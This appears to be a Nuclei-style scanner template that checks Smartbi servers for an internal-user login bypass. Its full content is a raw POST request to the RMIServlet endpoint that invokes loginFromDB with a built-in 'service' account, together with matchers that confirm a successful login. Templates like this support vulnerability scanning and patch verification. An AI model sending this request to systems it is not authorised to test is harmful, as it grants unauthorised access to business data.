id: poc-yaml-Smartbi-neizhi-user-bypass-Login
info:
  name: Smartbi Internal User Login Bypass Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: authentication-bypass
http:
  - raw:
      - |
        POST /smartbi/vision/RMIServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        className=UserService&methodName=loginFromDB&params=["service","0a"]
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"result":true'
          - '"retCode":0'
